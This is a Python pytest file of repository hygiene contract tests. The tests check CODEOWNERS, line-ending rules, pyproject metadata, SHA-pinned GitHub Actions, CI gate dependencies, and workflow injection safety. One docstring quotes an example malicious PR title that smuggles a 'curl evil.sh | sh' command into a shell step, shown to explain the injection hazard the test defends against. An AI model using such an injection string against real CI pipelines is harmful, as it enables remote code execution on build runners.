"""Repository contract tests for repo hygiene gating files.

Config-only changes are normally untestable, yet deleting or weakening one of
the files asserted here removes a real safety property with no visible symptom:

- ``.github/CODEOWNERS`` losing its wildcard line silently stops every path
  from requiring review.
- ``.gitattributes`` going missing leaves line-ending normalisation undefined
  across platforms, so the same file content diffs differently per machine.
- ``.gitignore`` losing the council rule lets a regenerated council artifact
  back into a commit, which permanently reddens the gitleaks pre-push gate
  because that hook scans the full git history rather than the working tree.
- ``pyproject.toml`` keeping the ``hatchling`` scaffolding description
  publishes ``Add your description here`` to every index that reads the
  built metadata, and no build or lint step complains about it.
- ``pyproject.toml`` advertising a ``requires-python`` floor below the
  interpreter the repo is actually pinned to claims support for a release that
  neither the linter, the type checker, nor the CI matrix ever exercises.
- a workflow under ``.github/workflows/`` dropping its ``permissions`` or
  ``concurrency`` block: an absent ``permissions`` block silently inherits
  whatever the repository default happens to be, and an absent ``concurrency``
  block lets superseded runs pile up instead of cancelling each other.
- a third-party ``uses:`` falling back to a mutable tag or branch: whoever
  controls the tag controls the code CI runs, and the 40-hex pin plus its
  trailing version comment is what keeps that boundary immutable while keeping
  the jump reviewable.
- ``ci-status-checker`` losing a job id from its ``needs``: ``CI Status`` is the
  single required status check, so a job omitted from ``needs`` quietly stops
  gating merges, with no symptom in the Actions UI, the ruleset, or a red build.
- a ``run:`` body interpolating ``${{ github.event.pull_request.* }}``: a
  ``run:`` body is evaluated as a shell script, so an attacker-controlled
  branch name or PR title becomes command injection rather than data.
- the ``detect-changes`` path filters dropping a path they claim to guard: the
  ``CI Status`` gate is fail-closed, so an under-specified filter skips exactly
  the jobs that should have run.

Every assertion below is derived from file contents or from a real ``git``
subprocess run, so each one can be observed to fail under a targeted mutation.
"""

from __future__ import annotations

import re
import shutil

# This module must ask git directly, so `subprocess` is unavoidable. Every call
# below uses a fixed argv, `shell=False`, and no interpolated user input.
import subprocess  # ruff: ignore[suspicious-subprocess-import]
import tomllib
from pathlib import Path

import pytest
import yaml

ALWAYS_CONDITION = "always()"
CODEOWNERS_WILDCARD = "* @iamwatchdogs"
COMMIT_SHA_RE = re.compile(r"[0-9a-f]{40}")
COUNCIL_ARTIFACT = Path(".agents/council/extraction-candidates.jsonl")
ENV_KEY = "env"
EXPECTED_PATH_FILTERS = frozenset({"json", "python", "workflows"})
GIT_ATTRIBUTES_RULE = "* text=auto eol=lf"
LOCAL_ACTION_PREFIXES = ("./", ".\\", "docker://")
MIN_DESCRIPTION_LENGTH = 20
PATHS_FILTER_ACTION = "dorny/paths-filter"
PYPROJECT_MANIFEST = Path("pyproject.toml")
PYTHON_VERSION_PIN = Path(".python-version")
QUOTED_TRIGGER_KEY = "on"
REQUIRED_PYTHON_FILTER_PATHS = ("pyproject.toml", "uv.lock")
REQUIRED_REQUIRES_PYTHON = ">=3.14"
REQUIRED_STATUS_CHECK_NAME = "CI Status"
REQUIRED_WORKFLOWS_FILTER_PATH = ".github/workflows/*.yml"
RUN_KEY = "run"
RUN_SUFFIX = f".{RUN_KEY}"
SCAFFOLD_PLACEHOLDER_DESCRIPTION = "Add your description here"
TRIGGER_KEY = True  # PyYAML (YAML 1.1) resolves the bare key `on` to `True`.
UNTRUSTED_INPUT_RE = re.compile(
    r"\$\{\{\s*github\.event\.(?:pull_request|issue)\b[^{}]*\}\}"
)
VERSION_COMMENT_RE = re.compile(r"v\d[\w.+-]*")
WORKFLOW_EXPRESSION_RE = re.compile(r"\$\{\{[^{}]*\}\}")
WORKFLOWS_DIR = Path(".github/workflows")

# Matched against the raw line so the trailing comment requirement is actually
# observable. Parsing alone would discard the comment entirely, and a bare
# `@v4` is a perfectly legal reference that must still fail.
USES_LINE_RE = re.compile(
    r"^\s*(?:-\s+)?uses:\s*(?P<reference>\S+)(?:\s+#\s*(?P<comment>\S+))?\s*$"
)


@pytest.fixture(scope="session")
def repo_root() -> Path:
    """Locate the repository root by walking up from this test file.

    Returns:
        The first ancestor directory of this file that holds a
        ``pyproject.toml``, which is this repository's root.

    Raises:
        RuntimeError: If no ancestor directory holds a ``pyproject.toml``.
    """
    for candidate in Path(__file__).resolve().parents:
        if (candidate / "pyproject.toml").is_file():
            return candidate
    msg = f"no pyproject.toml found in any parent of {__file__}"
    raise RuntimeError(msg)


def _workflow_paths(repo_root: Path) -> list[Path]:
    """List every workflow definition under ``.github/workflows``.

    The directory is walked rather than hardcoded to ``ci.yml`` because further
    workflows are added over time, and a test that only ever inspects one file
    would keep passing while a new workflow violated every rule below.

    Args:
        repo_root: The repository root.

    Returns:
        Every ``*.yml`` and ``*.yaml`` file below ``.github/workflows``, sorted
        so failure messages are stable between runs.
    """
    workflows_dir = repo_root / WORKFLOWS_DIR
    found = sorted({*workflows_dir.rglob("*.yml"), *workflows_dir.rglob("*.yaml")})
    assert found, (
        f"{workflows_dir} holds no workflow files, so every workflow contract "
        "below would pass without inspecting anything"
    )
    return found


def _as_mapping(node: object, label: str) -> dict[object, object]:
    """Re-type a parsed YAML mapping so the gradual type stays contained.

    PyYAML ships no type information, so every node it returns is gradual.
    Re-typing at this single boundary keeps that from propagating into the
    assertions and into the type checker, while still failing loudly if the
    node is not a mapping at all.

    Args:
        node: The node to interpret as a mapping.
        label: What the node is meant to be, used in the failure message.

    Returns:
        The same mapping, typed as ``dict[object, object]``.
    """
    assert isinstance(node, dict), (
        f"{label} is not a mapping (got {type(node).__name__})"
    )
    # The explicit key/value rebuild is deliberate rather than incidental.
    # `dict(node)`, `mapping.update(node)` and `dict(node.items())` are
    # equivalent at runtime, but each widens PyYAML's gradual key and value
    # types, and only this form lands in `dict[object, object]`. The
    # suppression is on the rewrite ruff would otherwise suggest, which the
    # type checker then rejects -- a rewrite that trades a lint for a type
    # error is not an improvement.
    return {  # ruff: ignore[unnecessary-comprehension]
        key: value for key, value in node.items()
    }


def _load_workflow(path: Path) -> dict[object, object]:
    """Parse a workflow file into its top-level mapping.

    Args:
        path: The workflow file to parse.

    Returns:
        The parsed top-level mapping, with keys exactly as PyYAML produced them.
    """
    return _as_mapping(yaml.safe_load(path.read_text(encoding="utf-8")), str(path))


def _trigger_value(data: dict[object, object]) -> object:
    """Return a workflow's parsed ``on:`` value under either YAML 1.1 spelling.

    PyYAML implements YAML 1.1, in which the bare key ``on`` is the boolean
    ``True`` rather than the string ``"on"``. A quoted ``"on"`` stays a string.
    Both spellings declare the same trigger, so neither is mistaken for a
    missing one; the key is never renamed on disk to work around this.

    Args:
        data: A parsed workflow mapping.

    Returns:
        The trigger value, or ``None`` when no trigger is declared.
    """
    if TRIGGER_KEY in data:
        return data[TRIGGER_KEY]
    return data.get(QUOTED_TRIGGER_KEY)


def _workflow_jobs(
    data: dict[object, object], path: Path
) -> dict[str, dict[object, object]]:
    """Return a workflow's jobs, keyed by job id.

    Args:
        data: A parsed workflow mapping.
        path: The workflow the mapping came from, used in failure messages.

    Returns:
        The ``jobs:`` mapping with stringified job ids.
    """
    jobs = _as_mapping(data.get("jobs"), f"`jobs:` in {path}")
    typed: dict[str, dict[object, object]] = {}
    for key, value in jobs.items():
        job = _as_mapping(value, f"job {key!r} in {path}")
        typed[str(key)] = job
    return typed


def _job_steps(job: dict[object, object]) -> list[dict[object, object]]:
    """Return the step mappings declared by one job.

    Args:
        job: A parsed job mapping.

    Returns:
        Every mapping in the job's ``steps:`` list, or an empty list when the
        job declares no steps.
    """
    steps = job.get("steps")
    if not isinstance(steps, list):
        return []
    return [_as_mapping(step, "a step") for step in steps if isinstance(step, dict)]


def _needed_job_ids(needs: object) -> set[str]:
    """Normalise a job's ``needs:`` value into a set of job ids.

    GitHub accepts a bare id, a comma-separated string, a list, or a mapping of
    id to result condition, so all four are collapsed to the same set here.

    Args:
        needs: The raw ``needs:`` value.

    Returns:
        The referenced job ids, empty when the value is not a usable form.
    """
    if isinstance(needs, str):
        return {part.strip() for part in needs.split(",") if part.strip()}
    if isinstance(needs, dict):
        return {str(key) for key in needs}
    if isinstance(needs, list):
        return {str(item) for item in needs}
    return set()


def _normalise_expression(text: str) -> str:
    """Strip the ``${{ }}`` wrapper and collapse whitespace from an expression.

    Args:
        text: A raw ``if:`` value from a parsed workflow.

    Returns:
        The expression body, so ``${{ always() }}`` and ``always()`` compare
        equal.
    """
    stripped = text.strip()
    if stripped.startswith("${{") and stripped.endswith("}}"):
        stripped = stripped[3:-2]
    return " ".join(stripped.split())


def _is_third_party_action(reference: str) -> bool:
    """Report whether a ``uses:`` value names a separately published action.

    ``./path`` and ``.\\path`` are checked-out local actions and ``docker://``
    values are container images. Neither is an action repository, and neither
    takes a commit SHA, so neither is subject to the pinning rule.

    Args:
        reference: The right-hand side of a ``uses:`` line.

    Returns:
        True when the reference names a third-party ``owner/repo@ref`` action.
    """
    if reference.startswith(LOCAL_ACTION_PREFIXES):
        return False
    return "/" in reference


def _pin_problems(reference: str, comment: str | None) -> list[str]:
    """Describe why a third-party ``uses:`` reference is not correctly pinned.

    Args:
        reference: The right-hand side of the ``uses:`` line.
        comment: The trailing ``# ...`` comment on that line, if it has one.

    Returns:
        One message per violated rule, empty when the pin is already correct.
    """
    owner_repo, separator, revision = reference.rpartition("@")
    if not separator or not owner_repo:
        return ["no `@` revision at all, so the reference is unpinned"]
    problems: list[str] = []
    if not COMMIT_SHA_RE.fullmatch(revision):
        problems.append(
            f"revision {revision!r} is not a 40-character lowercase-hex commit "
            "SHA, so it is a mutable tag or branch"
        )
    if comment is None:
        problems.append("the line carries no `# vX.Y.Z` version comment")
    elif not VERSION_COMMENT_RE.fullmatch(comment):
        problems.append(
            f"trailing comment {comment!r} is not a `# vX.Y.Z` version comment"
        )
    return problems


def _interpolation_sites(
    node: object, location: str, *, in_env: bool
) -> list[tuple[str, str, bool]]:
    """Find every ``${{ ... }}`` expression in a parsed workflow.

    The walk is structural rather than textual so ``in_env`` is derived from
    the actual YAML path: an expression is only considered safely quoted when it
    sits in a value of a mapping whose key is ``env``, at job level or step
    level. Everything else -- a ``run:`` body, a step ``name:``, an ``if:``, a
    ``with:`` input -- is reported.

    Args:
        node: The current YAML node, of any type.
        location: Dotted path of ``node`` within the workflow, for messages.
        in_env: Whether an enclosing mapping key was ``env``.

    Returns:
        One ``(location, text, in_env)`` triple per string scalar that
        interpolates an expression.
    """
    if isinstance(node, str):
        return [(location, node, in_env)] if WORKFLOW_EXPRESSION_RE.search(node) else []
    if isinstance(node, dict):
        found: list[tuple[str, str, bool]] = []
        for key, value in node.items():
            child = f"{location}.{key}" if location else str(key)
            found.extend(
                _interpolation_sites(value, child, in_env=in_env or key == ENV_KEY)
            )
        return found
    if isinstance(node, list):
        found = []
        for index, value in enumerate(node):
            found.extend(
                _interpolation_sites(value, f"{location}[{index}]", in_env=in_env)
            )
        return found
    return []


def _filter_paths(parsed: object, filter_name: str) -> set[str]:
    """Return the path globs declared for one named ``paths-filter`` filter.

    Args:
        parsed: The decoded ``filters:`` mapping.
        filter_name: The filter whose globs are wanted.

    Returns:
        Every glob declared under ``filter_name``, or an empty set when the
        filter is absent or is not a list of globs.
    """
    if not isinstance(parsed, dict):
        return set()
    globs = parsed.get(filter_name)
    if not isinstance(globs, list):
        return set()
    return {str(glob) for glob in globs}


def _paths_filter_blocks(repo_root: Path) -> list[tuple[str, object]]:
    """Locate every ``dorny/paths-filter`` step and decode its ``filters:``.

    Args:
        repo_root: The repository root.

    Returns:
        One ``(site, parsed)`` pair per path-filter step, where ``site`` names
        the file, job and step and ``parsed`` is the decoded filter mapping.
    """
    blocks: list[tuple[str, object]] = []
    for path in _workflow_paths(repo_root):
        jobs = _workflow_jobs(_load_workflow(path), path)
        for job_id, job in jobs.items():
            for index, step in enumerate(_job_steps(job)):
                if not str(step.get("uses", "")).startswith(PATHS_FILTER_ACTION):
                    continue
                site = f"{path.relative_to(repo_root)}::{job_id}::step[{index}]"
                with_block = step.get("with")
                assert isinstance(with_block, dict), (
                    f"{site} runs {PATHS_FILTER_ACTION} with no `with:` block, so "
                    "it filters nothing and every downstream job is skipped"
                )
                filters = with_block.get("filters")
                assert isinstance(filters, str), (
                    f"{site} declares a non-string `filters:` value ({filters!r}); "
                    f"{PATHS_FILTER_ACTION} requires a YAML string of filters"
                )
                blocks.append((site, yaml.safe_load(filters)))
    return blocks


def test_codeowners_gates_every_path_behind_one_owner(repo_root: Path) -> None:
    """Assert ``.github/CODEOWNERS`` claims the whole repository.

    Args:
        repo_root: The repository root, used to locate ``.github/CODEOWNERS``.
    """
    codeowners = repo_root / ".github" / "CODEOWNERS"
    assert codeowners.is_file(), f"required gating file is missing: {codeowners}"

    owner_lines = [
        stripped
        for line in codeowners.read_text(encoding="utf-8").splitlines()
        if (stripped := line.strip()) and not stripped.startswith("#")
    ]

    assert owner_lines, (
        f"{codeowners} declares no owner line, so nothing in the repository "
        "requires review; add a line reading "
        f"{CODEOWNERS_WILDCARD!r}"
    )
    assert owner_lines[0] == CODEOWNERS_WILDCARD, (
        f"the first owner line of {codeowners} is {owner_lines[0]!r}, expected "
        f"the whole-repo wildcard {CODEOWNERS_WILDCARD!r}; a narrower or "
        "differently-owned first line leaves paths ungated"
    )


def test_gitattributes_pins_every_text_file_to_lf(repo_root: Path) -> None:
    """Assert ``.gitattributes`` pins line endings to LF for all text files.

    Args:
        repo_root: The repository root, used to locate ``.gitattributes``.
    """
    gitattributes = repo_root / ".gitattributes"
    assert gitattributes.is_file(), f"required gating file is missing: {gitattributes}"

    rules = [
        line.strip() for line in gitattributes.read_text(encoding="utf-8").splitlines()
    ]
    assert GIT_ATTRIBUTES_RULE in rules, (
        f"{gitattributes} has no line exactly {GIT_ATTRIBUTES_RULE!r}; the "
        f"parsed rules were {rules!r}. A per-extension rule such as "
        "'*.py text=auto eol=lf' does not satisfy this, because the "
        "repository-wide rule is what makes normalisation total"
    )


def test_generated_council_artifact_is_never_committable(repo_root: Path) -> None:
    """Assert git itself reports the generated council file as ignored.

    This deliberately asks ``git`` instead of pattern-matching ``.gitignore``,
    so the assertion tracks the property that matters: the path cannot be
    staged. A weakened rule, or one whose glob no longer matches, fails here.

    Args:
        repo_root: The repository root, which is the working directory git is
            invoked in and the root its ignore rules are resolved against.
    """
    git = shutil.which("git")
    assert git is not None, "the git executable is not available on PATH"

    relative = COUNCIL_ARTIFACT.as_posix()
    completed = subprocess.run(  # ruff: ignore[subprocess-without-shell-equals-true]
        [git, "check-ignore", "--no-index", "-q", relative],
        cwd=repo_root,
        check=False,
        capture_output=True,
        text=True,
    )
    assert completed.returncode == 0, (
        f"git check-ignore --no-index exited {completed.returncode} for "
        f"{relative}, so that path is not ignored (0 means ignored, 1 means not "
        "ignored). The council extraction candidates file is regenerated on "
        "every council run and its SHA-256 dedup_key values trip gitleaks' "
        "generic-api-key rule, which scans full git history and would leave "
        f"the pre-push gate permanently red. {completed.stderr.strip()}"
    )


def test_project_description_is_not_the_scaffolding_placeholder(
    repo_root: Path,
) -> None:
    """Assert ``[project] description`` is real prose, not a ``hatchling`` stub.

    ``hatchling`` writes ``Add your description here`` into a freshly scaffolded
    manifest and no later build, lint or type check step objects to it, so the
    placeholder silently ships as the package's one-line summary. The comparison
    is case-insensitive because recasing the leading capital is the cheapest way
    to slip past a literal ``!=`` without actually writing a description.

    Args:
        repo_root: The repository root, used to locate ``pyproject.toml``.
    """
    manifest_path = repo_root / PYPROJECT_MANIFEST
    assert manifest_path.is_file(), f"required manifest is missing: {manifest_path}"

    project = tomllib.loads(manifest_path.read_text(encoding="utf-8"))["project"]
    description = project["description"]
    assert isinstance(description, str), (
        f"[project] description in {manifest_path} must be a string, got "
        f"{type(description).__name__} ({description!r})"
    )

    assert description.casefold() != SCAFFOLD_PLACEHOLDER_DESCRIPTION.casefold(), (
        f"[project] description in {manifest_path} is still the hatchling "
        f"scaffolding placeholder {description!r}; replace it with prose that "
        "describes what this package publishes"
    )

    stripped_description = description.strip()
    assert stripped_description, (
        f"[project] description in {manifest_path} is whitespace-only "
        f"({description!r}); it must carry actual text"
    )
    assert len(stripped_description) >= MIN_DESCRIPTION_LENGTH, (
        f"[project] description in {manifest_path} is "
        f"{len(stripped_description)} character(s) once stripped "
        f"({description!r}), which is below the {MIN_DESCRIPTION_LENGTH}-character "
        "floor, so it is a stub rather than a description"
    )


def test_requires_python_agrees_with_the_pinned_interpreter(repo_root: Path) -> None:
    """Assert the manifest's ``requires-python`` floor matches the pinned tools.

    ``.python-version`` is the local interpreter, ``[tool.ty.environment]
    python-version`` is what the type checker resolves against, ``[tool.ruff]
    target-version`` is what the linter assumes, and the CI matrix only runs
    3.14. This repository shipped exactly that drift: ``requires-python`` read
    ``>=3.13`` while ``.python-version``, ``[tool.ty.environment]
    python-version`` and ``[tool.ruff] target-version`` were all already
    ``3.14``/``py314``. The manifest therefore advertised 3.13 support that lint
    and type checking never verified, and no build, lint or type check step
    objected until the floor was reconciled against the pin.

    Args:
        repo_root: The repository root, used to locate ``pyproject.toml`` and
            ``.python-version``.
    """
    manifest_path = repo_root / PYPROJECT_MANIFEST
    version_path = repo_root / PYTHON_VERSION_PIN
    assert manifest_path.is_file(), f"required manifest is missing: {manifest_path}"
    assert version_path.is_file(), (
        f"required interpreter pin is missing: {version_path}"
    )

    project = tomllib.loads(manifest_path.read_text(encoding="utf-8"))["project"]
    requires_python = project["requires-python"]
    assert isinstance(requires_python, str), (
        f"[project] requires-python in {manifest_path} must be a string, got "
        f"{type(requires_python).__name__} ({requires_python!r})"
    )

    pinned_version = version_path.read_text(encoding="utf-8").strip()
    assert pinned_version, (
        f"{version_path} pins an empty interpreter version, so nothing "
        "reconciles the manifest floor against a real interpreter"
    )

    reconciled = f">={pinned_version}"
    assert requires_python == reconciled, (
        f"interpreter gates disagree: [project] requires-python in "
        f"{manifest_path} is {requires_python!r}, while {version_path} pins "
        f"{pinned_version!r}, which reconciles to {reconciled!r}. Exactly one of "
        f"those two files is wrong -- correct requires-python in "
        f"{manifest_path} or the pin in {version_path}, then re-check "
        "[tool.ruff] target-version and [tool.ty.environment] python-version"
    )

    assert requires_python == REQUIRED_REQUIRES_PYTHON, (
        f"[project] requires-python in {manifest_path} is {requires_python!r}, "
        f"expected {REQUIRED_REQUIRES_PYTHON!r}; the manifest floor must equal "
        "the interpreter that the linter, the type checker and CI actually use"
    )


def test_third_party_actions_are_sha_pinned_with_a_version_comment(
    repo_root: Path,
) -> None:
    """Assert every third-party ``uses:`` is an immutable SHA plus a version.

    A ``uses:`` value may name a mutable reference such as a tag (``@v4``) or a
    branch (``@main``). Whoever controls that tag controls the code this CI
    executes, and nothing in the workflow diff reveals the swap, because the tag
    is a perfectly legal reference that reads identically before and after. A
    40-character commit SHA is immutable, so the review that read the old line
    still describes the new one.

    The ``# vX.Y.Z`` comment is asserted against the raw line text rather than
    the parsed value, because parsing would discard the comment entirely and the
    requirement would silently become untestable. The comment is what makes the
    pin reviewable: Dependabot rewrites the SHA and relies on the comment to
    keep the jump legible, so dropping it destroys the audit trail even though
    it does not weaken the pin itself.

    Args:
        repo_root: The repository root, used to locate ``.github/workflows``.
    """
    inspected: list[str] = []
    offenders: list[str] = []
    for path in _workflow_paths(repo_root):
        for line_number, line in enumerate(
            path.read_text(encoding="utf-8").splitlines(), start=1
        ):
            match = USES_LINE_RE.match(line)
            if match is None:
                continue
            reference = match.group("reference")
            if not _is_third_party_action(reference):
                continue
            site = f"{path.relative_to(repo_root)}:{line_number}"
            inspected.append(f"{site} {reference}")
            problems = _pin_problems(reference, match.group("comment"))
            offenders.extend(f"{site} {reference}: {problem}" for problem in problems)

    assert inspected, (
        "no third-party `uses:` reference was found in any workflow under "
        f"{WORKFLOWS_DIR}, so SHA pinning is untested; at least one reference "
        "of the form `owner/repo@<40-hex-sha>` must exist for this to mean "
        "anything"
    )
    assert not offenders, (
        "third-party actions that are not SHA-pinned with a version comment:\n"
        + "\n".join(offenders)
        + "\nPin each to a 40-character lowercase-hex commit SHA and keep the "
        "`# vX.Y.Z` comment on the same line, so a mutable tag cannot change "
        "the code CI runs and Dependabot can still read the jump"
    )


def test_required_status_check_needs_every_other_job(repo_root: Path) -> None:
    """Assert the ``CI Status`` gate depends on every other job and always runs.

    The branch ruleset requires exactly one status check, ``CI Status``, which
    is implemented as a job that succeeds only when every applicable job
    succeeded. A job added to the workflow without also being added to
    ``needs`` therefore stops gating merges, and there is no symptom anywhere:
    not a red build, not a changed Actions UI, not a different ruleset. That is
    the exact silent-regression class these contract tests exist to catch, so
    the comparison is set equality in both directions rather than a subset
    check that would tolerate a stale id.

    ``if: always()`` belongs to the same contract. GitHub reports a *skipped*
    job as a successful required check, so without it a cancelled run reports
    the gate itself as skipped -- that is, passing -- and broken code merges.

    Args:
        repo_root: The repository root, used to locate ``.github/workflows``.
    """
    catalogue: dict[Path, dict[str, dict[object, object]]] = {}
    owners: list[tuple[Path, str]] = []
    for path in _workflow_paths(repo_root):
        jobs = _workflow_jobs(_load_workflow(path), path)
        catalogue[path] = jobs
        owners.extend(
            (path, job_id)
            for job_id, job in jobs.items()
            if job.get("name") == REQUIRED_STATUS_CHECK_NAME
        )

    assert owners, (
        f"no job named {REQUIRED_STATUS_CHECK_NAME!r} exists in any workflow "
        f"under {WORKFLOWS_DIR}. The branch ruleset gates merges on that exact "
        "name, so without it the repository has no enforced status check"
    )
    assert len(owners) == 1, (
        f"expected exactly one job named {REQUIRED_STATUS_CHECK_NAME!r}, found "
        f"{[f'{path.name}:{job_id}' for path, job_id in owners]}"
    )

    gate_path, gate_id = owners[0]
    gate_job = catalogue[gate_path][gate_id]
    expected = set(catalogue[gate_path]) - {gate_id}
    needed = _needed_job_ids(gate_job.get("needs"))

    missing = sorted(expected - needed)
    assert not missing, (
        f"job {gate_id!r} in {gate_path} does not depend on {missing}, so those "
        f"jobs no longer gate merges. {REQUIRED_STATUS_CHECK_NAME!r} is the only "
        "required check, and it succeeds whenever every job in its `needs` list "
        "succeeded, so a job absent from that list is invisible: it can fail, be "
        "cancelled, or be dropped, and the gate stays green. Add the ids to "
        f"{REQUIRED_STATUS_CHECK_NAME!r}.needs and forward their `result`"
    )

    extra = sorted(needed - expected)
    assert not extra, (
        f"job {gate_id!r} in {gate_path} depends on {extra}, which is not a job "
        f"declared in that file. The file declares "
        f"{sorted(catalogue[gate_path])}; `needs` must name existing jobs only"
    )

    condition = _normalise_expression(str(gate_job.get("if", "")))
    assert condition == ALWAYS_CONDITION, (
        f"job {gate_id!r} in {gate_path} declares if: {condition!r} rather than "
        f"{ALWAYS_CONDITION!r}. GitHub treats a skipped job as a *successful* "
        "required check, so a cancelled run would report the gate itself as "
        "skipped -- that is, passing -- and broken code would merge. Without "
        "this condition the gate silently stops gating exactly when a run is "
        "cancelled, which is when it matters most"
    )


def test_every_workflow_declares_on_permissions_and_concurrency(
    repo_root: Path,
) -> None:
    """Assert each workflow declares its trigger, permissions and concurrency.

    An absent ``permissions`` block means the workflow silently inherits
    whatever the repository-wide default happens to be. If that default is later
    loosened to ``write-all``, every job in every workflow gains write scope
    without a single line changing, and the workflow that least deserves it
    becomes the workflow that can push to the default branch. An absent
    ``concurrency`` block means superseded runs are not cancelled, so a rapid
    push sequence burns runner minutes re-testing commits that are already
    obsolete and the queue of stale runs reports stale results.

    Args:
        repo_root: The repository root, used to locate ``.github/workflows``.
    """
    for path in _workflow_paths(repo_root):
        relative = path.relative_to(repo_root)
        data = _load_workflow(path)

        assert _trigger_value(data), (
            f"{relative} declares no truthy `on:` key, so the workflow is "
            "unreachable and every job in it is dead configuration"
        )
        assert "permissions" in data, (
            f"{relative} declares no workflow-level `permissions:` block, so it "
            "silently inherits the repository default. If that default is ever "
            "loosened, this workflow's token scope changes without any line "
            "here changing; declare `contents: read` explicitly"
        )
        assert "concurrency" in data, (
            f"{relative} declares no `concurrency:` block, so superseded runs "
            "are not cancelled. Each new push leaves the previous run burning "
            "runner minutes to produce a verdict about a commit nobody will "
            "ship; add a `group` keyed on head_ref or run_id and set "
            "`cancel-in-progress: true`"
        )


def test_detect_changes_path_filters_cover_the_guarded_directories(
    repo_root: Path,
) -> None:
    """Assert the ``paths-filter`` config covers the paths it claims to guard.

    The ``CI Status`` gate is fail-closed, so an under-specified filter does
    not merely save time, it skips exactly the jobs that should have run. The
    sharpest instance is a dependency or tooling change that is not a ``.py``
    file: edit ``pyproject.toml`` or ``uv.lock`` without listing it under
    ``python``, and the Python jobs never start, the gate reads their absence
    as a legitimate skip, and a broken manifest merges behind green CI. The
    same argument applies to ``.github/workflows/*.yml`` under ``workflows``,
    where a typo'd extension would unguard every workflow edit.

    Args:
        repo_root: The repository root, used to locate ``.github/workflows``.
    """
    blocks = _paths_filter_blocks(repo_root)
    assert blocks, (
        f"no workflow under {WORKFLOWS_DIR} runs the {PATHS_FILTER_ACTION} step, "
        "so no path filter exists and every downstream job is gated on a "
        "convention nothing declares"
    )

    for site, parsed in blocks:
        assert isinstance(parsed, dict), (
            f"{site} has a `filters:` string that does not decode to a mapping "
            f"(got {type(parsed).__name__})"
        )
        names = {str(key) for key in parsed}
        assert names == EXPECTED_PATH_FILTERS, (
            f"{site} declares filters {sorted(names)}, expected exactly "
            f"{sorted(EXPECTED_PATH_FILTERS)}. Each named filter must match a "
            "job's `needs.detect-changes.outputs` reference, so a renamed or "
            "dropped filter leaves that job's condition permanently false and "
            "the job silently skipped"
        )

        python_paths = _filter_paths(parsed, "python")
        for required in REQUIRED_PYTHON_FILTER_PATHS:
            assert required in python_paths, (
                f"{site} does not list {required!r} under the `python` filter "
                f"(declared: {sorted(python_paths)}). A dependency or config "
                "change that is not a .py file would leave the Python jobs "
                "untriggered, and the fail-closed CI Status gate would read that "
                "skip as a pass"
            )

        workflows_paths = _filter_paths(parsed, "workflows")
        assert REQUIRED_WORKFLOWS_FILTER_PATH in workflows_paths, (
            f"{site} does not list {REQUIRED_WORKFLOWS_FILTER_PATH!r} under the "
            f"`workflows` filter (declared: {sorted(workflows_paths)}), so a "
            "workflow edit would not trigger the actionlint job that guards it"
        )


def test_no_untrusted_input_is_interpolated_into_run_blocks(repo_root: Path) -> None:
    """Assert no ``run:`` body interpolates ``${{ ... }}``.

    GitHub's own hardening guide requires untrusted input to reach a shell
    through ``env``, never through interpolation into the script text. A
    ``run:`` body is evaluated as a shell script, so writing
    ``${{ github.event.pull_request.title }}`` into one hands an
    attacker-controlled string to the shell verbatim, and a PR titled
    ``a"; curl evil.sh | sh; #`` executes on the runner. Passing the value
    through ``env`` and quoting it as ``"$PR_TITLE"`` makes the same string
    data instead of code.

    This is the highest-value attack surface in the repository, because the
    dependabot auto-merge workflow runs with write permissions: an injection
    there is not a red build but a push to the default branch.

    The assertion set is deliberately layered. The first check names the steps
    that carry both ``run:`` and ``env:``, because those are the ones where an
    expression was most likely to have been "helpfully" inlined and the failure
    needs a targeted message. The set-wide scan is what generalises: it also
    catches a ``run:`` with no ``env:`` block, and it catches untrusted input
    interpolated into a step ``name:``, an ``if:``, or a ``with:`` input, none
    of which is an ``env:`` mapping.

    Args:
        repo_root: The repository root, used to locate ``.github/workflows``.
    """
    sites: list[tuple[str, str, bool]] = []
    env_and_run: list[str] = []
    for path in _workflow_paths(repo_root):
        relative = path.relative_to(repo_root)
        data = _load_workflow(path)
        sites.extend(
            (f"{relative}::{loc}", text, in_env)
            for loc, text, in_env in _interpolation_sites(data, "", in_env=False)
        )
        for job_id, job in _workflow_jobs(data, path).items():
            for index, step in enumerate(_job_steps(job)):
                if RUN_KEY not in step or ENV_KEY not in step:
                    continue
                run_text = step[RUN_KEY]
                if isinstance(run_text, str) and WORKFLOW_EXPRESSION_RE.search(
                    run_text
                ):
                    env_and_run.append(f"{relative}::{job_id}::step[{index}]")

    assert sites, (
        f"no `${{{{ ... }}}}` expression was found in any workflow under "
        f"{WORKFLOWS_DIR}, so this scan is inspecting nothing. Every run that "
        "needs a matrix value or a step output interpolates one; if that is no "
        "longer true, this test should be deleted rather than left vacuous"
    )
    assert not env_and_run, (
        f"these steps carry both `run:` and `env:`, yet their `run:` body "
        f"interpolates an expression: {env_and_run}. A `run:` body is evaluated "
        "as a shell script, so a `${{ github.event.pull_request.* }}` inlined "
        "there turns an attacker-controlled branch name or PR title into command "
        "injection. Move the value into the step's `env:` block and quote the "
        'shell variable, e.g. `run: echo "$PR_TITLE"`'
    )

    run_sites: list[str] = []
    untrusted_outside_env: list[str] = []
    for site, text, in_env in sites:
        if site.endswith(RUN_SUFFIX):
            run_sites.append(site)
        if not in_env and UNTRUSTED_INPUT_RE.search(text):
            untrusted_outside_env.append(site)

    assert not run_sites, (
        f"these `run:` bodies interpolate an expression: {run_sites}. This is "
        "the set-wide form of the check above and also covers steps that have no "
        "`env:` block at all, where there is nowhere to move the value to yet"
    )
    assert not untrusted_outside_env, (
        "untrusted input is interpolated outside an `env:` mapping at "
        f"{untrusted_outside_env}. `github.event.pull_request.*` and "
        "`github.event.issue.*` are fully attacker-controlled, so they must "
        "reach a shell only through an `env:` mapping, never inline in a "
        "script, a step name, a condition, or a `with:` input"
    )
